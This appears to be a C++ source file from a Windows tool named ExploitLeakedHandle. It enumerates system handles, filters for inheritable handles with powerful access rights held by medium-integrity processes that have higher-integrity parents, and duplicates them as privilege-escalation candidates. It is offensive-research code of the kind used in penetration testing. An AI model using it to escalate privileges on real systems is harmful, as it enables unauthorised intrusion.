#include "ElhInit.h"
#include "ElhHelper.h"

void ElhInit::printBanner() {
    wprintf(
        L"\n  ______            _       _ _   _                _            _ _    _                 _ _"
        "\n |  ____|          | |     (_) | | |              | |          | | |  | |               | | |"
        "\n | |__  __  ___ __ | | ___  _| |_| |     ___  __ _| | _____  __| | |__| | __ _ _ __   __| | | ___"
        "\n |  __| \\ \\/ / '_ \\| |/ _ \\| | __| |    / _ \\/ _` | |/ / _ \\/ _` |  __  |/ _` | '_ \\ / _` | |/ _ \\"
        "\n | |____ >  <| |_) | | (_) | | |_| |___|  __/ (_| |   <  __/ (_| | |  | | (_| | | | | (_| | |  __/"
        "\n |______/_/\\_\\ .__/|_|\\___/|_|\\__|______\\___|\\__,_|_|\\_\\___|\\__,_|_|  |_|\\__,_|_| |_|\\__,_|_|\\___|"
        "\n             | |"
        "\n             |_|                                                      https://github.com/0x00Check\n\n"
    );
}

PSYSTEM_HANDLE_INFORMATION ElhInit::getSystemHandleInformation() {
    NTSTATUS ntStatus;
    PSYSTEM_HANDLE_INFORMATION pSystemHandleInfo = nullptr;
    ULONG ulSystemHandleInfoLength = 0;
    while (ntStatus = NtQuerySystemInformation(SystemHandleInformation, pSystemHandleInfo, ulSystemHandleInfoLength, &ulSystemHandleInfoLength) == STATUS_INFO_LENGTH_MISMATCH) {
        pSystemHandleInfo = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ulSystemHandleInfoLength);
    }
    return NT_SUCCESS(ntStatus) ? pSystemHandleInfo : nullptr;
}

bool ElhInit::handleBelongsToELH(SYSTEM_HANDLE_TABLE_ENTRY_INFO& handleInfo) {
    return handleInfo.UniqueProcessId == GetCurrentProcessId();
}

bool ElhInit::handleIsInheritable(UCHAR& handleAttributes) {
    return handleAttributes & OBJ_INHERIT;
}

bool ElhInit::handleTypeIsInteresting(UCHAR& objectTypeIndex, LPCWSTR& handleType) {
    switch (objectTypeIndex) {
    case PROCESS_HANDLE_TYPE:
        handleType = L"PROCESS";
        break;
    case THREAD_HANDLE_TYPE:
        handleType = L"THREAD";
        break;
    case FILE_HANDLE_TYPE:
        handleType = L"FILE";
        break;
    case SECTION_HANDLE_TYPE:
        handleType = L"SECTION";
        break;
    case KEY_HANDLE_TYPE:
        handleType = L"KEY";
        break;
    default:
        return false;
    }
    return true;
}

bool ElhInit::handleAccessIsInteresting(UCHAR& objectTypeIndex, ULONG& grantedAccess, std::vector<LPCWSTR>& accessRights) {
    BOOL hasInterestingRights = false;

    // Vector to store access masks & their corresponding names for each type
    std::vector<std::pair<ULONG, LPCWSTR>> interestingAccessMasks;
    // Determine the relevant interesting access masks based on type
    switch (objectTypeIndex) {
    case PROCESS_HANDLE_TYPE:
        interestingAccessMasks = {
            { PROCESS_ALL_ACCESS,                       L"PROCESS_ALL_ACCESS" },
            { PROCESS_CREATE_PROCESS,                   L"PROCESS_CREATE_PROCESS" },
            { PROCESS_CREATE_THREAD | PROCESS_VM_WRITE, L"PROCESS_CREATE_THREAD | PROCESS_VM_WRITE" },
            { PROCESS_DUP_HANDLE,	                    L"PROCESS_DUP_HANDLE" }
        };
        break;
    case THREAD_HANDLE_TYPE:
        interestingAccessMasks = {
            { THREAD_ALL_ACCESS,		   L"THREAD_ALL_ACCESS" },
            { THREAD_DIRECT_IMPERSONATION, L"THREAD_DIRECT_IMPERSONATION" },
            { THREAD_SET_CONTEXT,		   L"THREAD_SET_CONTEXT" }
        };
        break;
    case FILE_HANDLE_TYPE:
    case SECTION_HANDLE_TYPE:
    case KEY_HANDLE_TYPE:
        interestingAccessMasks = {
            {FILE_WRITE_DATA, L"FILE_WRITE_DATA"},
        };
        break;
    }

    for (auto accessMask : interestingAccessMasks) {
        if (ElhHelper::accessContainsRights(grantedAccess, accessMask.first)) {
            hasInterestingRights = true;
            accessRights.push_back(accessMask.second);
        }
    }
    return hasInterestingRights;
}

void ElhInit::findLeakedHandles(PSYSTEM_HANDLE_INFORMATION& pSystemHandleInfo, std::vector<ElhInit::HANDLE_OBJ>& interestingHandles) {
    printf("[+] Checking %d handles for potential abuse ..\n\n", pSystemHandleInfo->NumberOfHandles);
    for (ULONG i = 0; i < pSystemHandleInfo->NumberOfHandles; i++) {
        SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = pSystemHandleInfo->Handles[i];

        // Skip if the handle belongs to the current process, isn't inheritable/potentially abusable, or lacks abusable access rights
        LPCWSTR handleType;
        std::vector<LPCWSTR> accessRights;
        if (
            handleBelongsToELH(handleInfo) ||
            !handleIsInheritable(handleInfo.HandleAttributes) ||
            !handleTypeIsInteresting(handleInfo.ObjectTypeIndex, handleType) ||
            !handleAccessIsInteresting(handleInfo.ObjectTypeIndex, handleInfo.GrantedAccess, accessRights)
            ) {
            continue;
        }

        // Open handle to process -- if it fails, assume it's already priv and safe to skip
        HANDLE hProcess = ElhHelper::openProcessID(handleInfo.UniqueProcessId, PROCESS_ALL_ACCESS);
        if (hProcess == INVALID_HANDLE_VALUE) {
            continue;
        }

        // Save proc name/integrity/parent ID before closing handle
        std::wstring processName = ElhHelper::getProcessName(hProcess);
        DWORD dwProcIntegrity = ElhHelper::getProcessIntegrity(hProcess);
        USHORT uPPID = ElhHelper::getParentProcessID(hProcess);
        CloseHandle(hProcess);

        // Validate process integrity isn't already high
        if (dwProcIntegrity > SECURITY_MANDATORY_MEDIUM_RID || dwProcIntegrity <= SECURITY_MANDATORY_LOW_RID) {
            continue;
        }

        // Check if parent process integrity is higher (access denied/any fail == assume yes)
        HANDLE hParentProcess = ElhHelper::openProcessID(uPPID, PROCESS_QUERY_LIMITED_INFORMATION);
        DWORD dwParentIntegrity;
        if (hParentProcess != INVALID_HANDLE_VALUE) {
            dwParentIntegrity = ElhHelper::getProcessIntegrity(hParentProcess);
            CloseHandle(hParentProcess);
            if (dwParentIntegrity <= SECURITY_MANDATORY_MEDIUM_RID) {
                continue;
            }
        }

        // Get object name of handle
        HANDLE hProc = ElhHelper::openProcessID(handleInfo.UniqueProcessId, PROCESS_ALL_ACCESS);
        HANDLE hLocal = ElhHelper::duplicateHandle(handleInfo, hProc);
        std::wstring objectName = ElhHelper::getObjectName(hLocal, handleInfo.ObjectTypeIndex);

        // Skip if handle is THREAD type & belongs to itself
        if (handleInfo.ObjectTypeIndex == 0x8) {
            if (GetProcessIdOfThread(hLocal) == handleInfo.UniqueProcessId) {
                continue;
            }
        }

        // Save parent proc name
        std::wstring parentName = ElhHelper::getProcessName(uPPID);

        // Create obj & store in vector
        HANDLE_OBJ ihData = { 0 };
        ihData.handleInfo = handleInfo;
        ihData.handleType = handleType;
        ihData.handleRights = accessRights;
        ihData.objectName = objectName;
        ihData.procName = processName;
        ihData.parentPID = uPPID;
        ihData.parentName = parentName;

        interestingHandles.push_back(ihData);
    }
}